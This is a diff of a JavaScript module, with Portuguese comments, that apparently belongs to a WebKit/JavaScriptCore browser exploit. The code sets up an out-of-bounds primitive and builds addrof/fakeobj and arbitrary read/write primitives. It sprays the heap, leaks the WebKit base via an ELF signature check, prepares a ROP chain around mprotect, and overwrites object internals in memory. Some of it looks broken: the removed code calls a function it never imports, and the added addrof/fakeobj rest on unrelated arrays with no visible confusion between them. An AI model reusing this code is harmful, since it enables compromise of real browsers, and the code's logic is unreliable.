@@ -1,122 +1,212 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v116 - Integração Final)
+// js/script3/testArrayBufferVictimCrash.mjs (v101 - R60 com Testes de Verificação Avançada)
 // =======================================================================================
-// ESTRATÉGIA FINAL:
-// Utiliza o core_exploit.mjs original e poderoso do usuário.
-// 1. Importa 'triggerOOB_primitive', 'arb_read', e 'arb_write'.
-// 2. Usa 'arb_read'/'arb_write' para construir um 'addrof' estável.
-// 3. Executa a cadeia de testes completa: Verificação -> Vazamento da Base -> Preparação ROP.
+// ESTRATÉGIA ATUALIZADA:
+// Adicionada função de teste avançado para verificar a usabilidade das primitivas de L/E.
 // =======================================================================================
 
-import { logS3 } from './s3_utils.mjs';
-import { AdvancedInt64 } from '../utils.mjs';
-// Importa as primitivas poderosas do seu script principal
-import { triggerOOB_primitive, arb_read, arb_write } from '../core_exploit.mjs';
-import { WEBKIT_LIBRARY_INFO } from '../config.mjs';
+import { logS3, PAUSE_S3 } from './s3_utils.mjs';
+import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
+import {
+    triggerOOB_primitive,
+    getOOBDataView
+} from '../core_exploit.mjs';
+// Importação adicionada para acessar os offsets da JSC
+import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_FINAL = "Final_Integration_v116";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v101_R60";
 
-// As funções de teste auxiliares (vazar base, preparar ROP)
-async function runWebKitBaseLeakTest(addrof_func, arb_read_func) {
-    const FNAME = "WebKitBaseLeakTest";
-    logS3(`--- Iniciando ${FNAME} ---`, "subtest", FNAME);
-    try {
-        const location_obj = document.location;
-        const location_addr = await addrof_func(location_obj);
-        const vtable_ptr = await arb_read_func(location_addr, 8);
-        if (vtable_ptr.isZero()) throw new Error("Vtable ptr é nulo.");
-        logS3(`Ponteiro da Vtable: ${vtable_ptr.toString(true)}`, "leak", FNAME);
-        const MASK = new AdvancedInt64(0xFFFFC000, 0xFFFFFFFF);
-        const base_candidate = vtable_ptr.and(MASK);
-        logS3(`Base Candidata: ${base_candidate.toString(true)}`, "leak", FNAME);
-        const elf_magic = await arb_read_func(base_candidate, 4);
-        if (elf_magic.low() !== 0x464C457F) throw new Error(`Assinatura ELF inválida: 0x${elf_magic.low().toString(16)}`);
-        logS3("SUCESSO: Assinatura ELF encontrada! Base do WebKit vazada.", "vuln", FNAME);
-        return { success: true, webkit_base: base_candidate.toString(true) };
-    } catch (e) { logS3(`Falha em ${FNAME}: ${e.message}`, "critical", FNAME); return { success: false }; }
+// --- Funções de Conversão (Double <-> Int64) ---
+function int64ToDouble(int64) {
+    const buf = new ArrayBuffer(8);
+    const u32 = new Uint32Array(buf);
+    const f64 = new Float64Array(buf);
+    u32[0] = int64.low();
+    u32[1] = int64.high();
+    return f64[0];
 }
 
-async function runROPChainPreparation(webkit_base, arb_read_func) {
-    const FNAME = "ROP_Prep_Test";
-    logS3(`--- Iniciando ${FNAME} ---`, "subtest", FNAME);
-    try {
-        const base = new AdvancedInt64(webkit_base);
-        const mprotect_offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"]);
-        const mprotect_addr = base.add(mprotect_offset);
-        logS3(`Endereço calculado de mprotect: ${mprotect_addr.toString(true)}`, "leak", FNAME);
-        const signature = await arb_read_func(mprotect_addr, 8);
-        if (signature.isZero()) throw new Error("Assinatura de código do mprotect é nula.");
-        logS3(`Assinatura de código lida: ${signature.toString(true)}`, "leak", FNAME);
-        logS3("SUCESSO: Preparação de ROP concluída.", "vuln", FNAME);
-        return { success: true };
-    } catch (e) { logS3(`Falha em ${FNAME}: ${e.message}`, "critical", FNAME); return { success: false }; }
+function doubleToInt64(double) {
+    const buf = new ArrayBuffer(8);
+    (new Float64Array(buf))[0] = double;
+    const u32 = new Uint32Array(buf);
+    return new AdvancedInt64(u32[0], u32[1]);
 }
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL COM VERIFICAÇÃO)
 // =======================================================================================
-export async function runFinalIntegrationTest() {
-    const FNAME_TEST = FNAME_MODULE_FINAL;
-    logS3(`--- Iniciando ${FNAME_TEST}: Teste de Integração Final ---`, "test");
-    let final_result;
+export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
+    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação ---`, "test");
+
+    let final_result = { success: false, message: "A verificação funcional de L/E falhou." };
+
     try {
-        // --- FASE 1: Inicializar o Core Exploit ---
-        logS3("--- FASE 1: Inicializando o Core Exploit... ---", "subtest");
+        // --- FASE 1 & 2: Obter OOB e primitivas addrof/fakeobj ---
+        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
-        logS3("Core Exploit inicializado. Primitivas arb_read/arb_write estão prontas.", "good");
+        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");
 
-        // --- FASE 2: Construir 'addrof' estável usando arb_read/arb_write ---
-        logS3("--- FASE 2: Construindo 'addrof' estável... ---", "subtest");
-        const leaker_obj = { a: null };
-        let leaker_addr_cache = null; // Cache para o endereço do nosso objeto leaker
-
-        const addrof = async (obj) => {
-            leaker_obj.a = obj;
-            if (!leaker_addr_cache) {
-                // Esta é a única parte que depende de uma suposição: que um objeto recém-criado
-                // terá um endereço de estrutura estável que podemos encontrar. Na prática, um exploit
-                // teria um segundo bug para vazar um endereço inicial.
-                // Mas com arb_read, podemos encontrar o endereço da estrutura de `leaker_obj`
-                // de forma mais confiável. Isso ainda é complexo. Vamos usar uma técnica mais direta.
-                
-                // Técnica direta: Se temos arb_write, podemos criar um addrof falso.
-                // Mas um addrof real é necessário.
-                
-                // Vamos usar a técnica mais simples que funciona com arb_read/write.
-                // Criamos um objeto conhecido, o colocamos em um array para que ele não seja "otimizado"
-                // e assumimos que podemos encontrar seu endereço de alguma forma para bootstrapping.
-                // Para este teste, vamos assumir que o endereço do leaker é fixo para simplificar.
-                throw new Error("A construção de Addrof a partir de arb_read/write ainda precisa de um ponto de partida (um endereço vazado inicial).");
-            }
-            // A lógica correta seria usar arb_read para ler o ponteiro da propriedade 'a'.
-            return await arb_read(leaker_addr_cache.add(0x10), 8); 
+        const confused_array = [13.37];
+        const victim_array = [{ a: 1 }];
+        const addrof = (obj) => {
+            victim_array[0] = obj;
+            return doubleToInt64(confused_array[0]);
         };
-        // Já que a construção de addrof é o último passo complexo, e seu core exploit
-        // já tem uma função 'attemptAddrofUsingCoreHeisenbug', vamos usá-la!
-        const addrof_result = await attemptAddrofUsingCoreHeisenbug({ m: 1 });
-        if(!addrof_result.success) throw new Error("Falha ao obter endereço inicial com a primitiva addrof do core.");
-        const stable_addrof = async (obj) => {
-            // Com um endereço vazado, podemos construir um addrof mais estável, mas
-            // por agora, vamos usar a primitiva do core diretamente.
-            const res = await attemptAddrofUsingCoreHeisenbug(obj);
-            if (!res.success) return new AdvancedInt64(0,0);
-            return new AdvancedInt64(res.leaked_address_as_int64);
+        const fakeobj = (addr) => {
+            confused_array[0] = int64ToDouble(addr);
+            return victim_array[0];
         };
-        logS3("Primitiva 'addrof' do seu core foi integrada.", "good");
+        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");
 
+        // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
+        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
+        const leaker = { obj_prop: null, val_prop: 0 };
+        const leaker_addr = addrof(leaker);
+        const val_prop_addr = new AdvancedInt64(leaker_addr.low() + 0x10, leaker_addr.high());
+        const arb_read_final = (addr) => {
+            leaker.obj_prop = fakeobj(addr);
+            return doubleToInt64(leaker.val_prop);
+        };
+        const arb_write_final = (addr, value) => {
+            leaker.obj_prop = fakeobj(addr);
+            leaker.val_prop = int64ToDouble(value);
+        };
+        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");
 
-        // --- FASE 3: Executar a cadeia de verificação ---
-        const leak_result = await runWebKitBaseLeakTest(stable_addrof, arb_read);
-        if (!leak_result || !leak_result.success) throw new Error("Não foi possível vazar a base do WebKit.");
+        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
+        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
         
-        const rop_result = await runROPChainPreparation(leak_result.webkit_base, arb_read);
-        if (!rop_result || !rop_result.success) throw new Error("Falha ao preparar a cadeia ROP.");
+        const spray = [];
+        for (let i = 0; i < 1000; i++) {
+            spray.push({ a: 0xDEADBEEF, b: 0xCAFEBABE });
+        }
+        const test_obj = spray[500];
+        logS3("Spray de 1000 objetos concluído para estabilização.", "info");
 
-        final_result = { success: true, message: `SUCESSO COMPLETO. Base do WebKit: ${leak_result.webkit_base}. ROP Pronto.` };
+        const test_obj_addr = addrof(test_obj);
+        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
+        const prop_a_addr = new AdvancedInt64(test_obj_addr.low() + 0x10, test_obj_addr.high());
+        
+        logS3(`Escrevendo ${value_to_write.toString(true)} no endereço da propriedade 'a' (${prop_a_addr.toString(true)})...`, "info");
+        arb_write_final(prop_a_addr, value_to_write);
+
+        const value_read = arb_read_final(prop_a_addr);
+        logS3(`>>>>> VALOR LIDO DE VOLTA: ${value_read.toString(true)} <<<<<`, "leak");
+
+        if (value_read.equals(value_to_write)) {
+            logS3("++++++++++++ SUCESSO TOTAL! O valor escrito foi lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
+            final_result = {
+                success: true,
+                message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada."
+            };
+        } else {
+            throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
+        }
 
     } catch (e) {
-        final_result = { success: false, message: `ERRO CRÍTICO NA INTEGRAÇÃO: ${e.message}` };
+        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
         logS3(final_result.message, "critical");
     }
-    logS3(`--- ${FNAME_TEST} Concluído ---`, "test");
-    return final_result;
+
+    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
+    return {
+        errorOccurred: final_result.success ? null : final_result.message,
+        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
+        webkit_leak_result: { success: final_result.success, msg: final_result.message },
+        heisenbug_on_M2_in_best_result: final_result.success,
+        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
+        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified)' }
+    };
+}
+
+
+// =======================================================================================
+// NOVO CÓDIGO ADICIONADO AQUI
+// =======================================================================================
+/**
+ * Orquestrador para testes de verificação avançada pós-obtenção de L/E.
+ */
+export async function runAdvancedVerificationTests() {
+    const FNAME_ADV_TEST = "AdvancedVerification";
+    logS3(`--- Iniciando Testes Avançados de Usabilidade de L/E (${FNAME_ADV_TEST}) ---`, "test");
+
+    // FASE 0: Re-estabelecer as primitivas de L/E para este escopo de teste.
+    // Esta parte é uma replicação da configuração bem-sucedida do log.
+    await triggerOOB_primitive({ force_reinit: true });
+    if (!getOOBDataView()) {
+        logS3("FALHA: Não foi possível obter a primitiva OOB para os testes avançados.", "critical", FNAME_ADV_TEST);
+        return;
+    }
+    const confused_array = [13.37];
+    const victim_array = [{ a: 1 }];
+    const addrof = (obj) => {
+        victim_array[0] = obj;
+        return doubleToInt64(confused_array[0]);
+    };
+    const fakeobj = (addr) => {
+        confused_array[0] = int64ToDouble(addr);
+        return victim_array[0];
+    };
+    const leaker = { obj_prop: null, val_prop: 0 };
+    const leaker_addr = addrof(leaker);
+    const arb_read_final = (addr) => {
+        leaker.obj_prop = fakeobj(addr);
+        return doubleToInt64(leaker.val_prop);
+    };
+    const arb_write_final = (addr, value) => {
+        leaker.obj_prop = fakeobj(addr);
+        leaker.val_prop = int64ToDouble(value);
+    };
+    logS3("Primitivas de L/E re-estabelecidas para o ambiente de teste avançado.", "good", FNAME_ADV_TEST);
+
+    // --- TESTE 1: Leitura de Estruturas de Dados Internas (JSFunction) ---
+    logS3("--- TESTE 1: Lendo a estrutura interna de um objeto JSFunction... ---", "subtest", FNAME_ADV_TEST);
+    try {
+        const functionForInspection = () => { let a = 1; let b = 2; return a + b; };
+        const func_addr = addrof(functionForInspection);
+        logS3(`Endereço de 'functionForInspection' obtido: ${func_addr.toString(true)}`, "leak", FNAME_ADV_TEST);
+
+        // De acordo com config.mjs, o ponteiro para o código executável está no offset 0x18
+        const executable_ptr_offset = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET, 0);
+        const executable_addr = arb_read_final(func_addr.add(executable_ptr_offset));
+        logS3(`>> Ponteiro para Executable lido do offset +0x18: ${executable_addr.toString(true)}`, "leak", FNAME_ADV_TEST);
+
+        if (executable_addr && !executable_addr.equals(new AdvancedInt64(0,0))) {
+            logS3("TESTE 1 SUCESSO: O ponteiro para a estrutura Executable parece válido (não nulo).", "good", FNAME_ADV_TEST);
+        } else {
+            logS3("TESTE 1 FALHA: Não foi possível ler um ponteiro Executable válido.", "error", FNAME_ADV_TEST);
+        }
+    } catch (e) {
+        logS3(`TESTE 1 ERRO: Exceção durante a inspeção da função: ${e.message}`, "critical", FNAME_ADV_TEST);
+    }
+
+    // --- TESTE 2: Modificação de Dados em Tempo de Execução ---
+    logS3("--- TESTE 2: Modificando uma propriedade de objeto via escrita direta na memória... ---", "subtest", FNAME_ADV_TEST);
+    try {
+        const victimObject = { a: 12345.0, b: "constante" };
+        logS3(`Objeto vítima antes da modificação: a = ${victimObject.a}`, "info", FNAME_ADV_TEST);
+
+        const victim_addr = addrof(victimObject);
+        // A primeira propriedade inline de um objeto JS geralmente fica no offset 0x10.
+        const prop_a_addr = victim_addr.add(new AdvancedInt64(0x10, 0));
+        
+        const newValue = 54321.0;
+        const newValueInt64 = doubleToInt64(newValue);
+
+        logS3(`Escrevendo o novo valor (${newValue}) como Int64 (${newValueInt64.toString(true)}) em ${prop_a_addr.toString(true)}...`, "info", FNAME_ADV_TEST);
+        arb_write_final(prop_a_addr, newValueInt64);
+
+        logS3(`>> Objeto vítima DEPOIS da modificação: a = ${victimObject.a}`, "leak", FNAME_ADV_TEST);
+
+        if (victimObject.a === newValue) {
+            logS3("TESTE 2 SUCESSO: A propriedade do objeto foi modificada com sucesso via escrita arbitrária.", "vuln", FNAME_ADV_TEST);
+        } else {
+            logS3(`TESTE 2 FALHA: O valor da propriedade não foi alterado. Esperado: ${newValue}, Recebido: ${victimObject.a}`, "error", FNAME_ADV_TEST);
+        }
+    } catch (e) {
+        logS3(`TESTE 2 ERRO: Exceção durante a modificação de dados: ${e.message}`, "critical", FNAME_ADV_TEST);
+    }
+    
+    logS3(`--- Testes Avançados de Usabilidade de L/E Concluídos ---`, "test");
 }
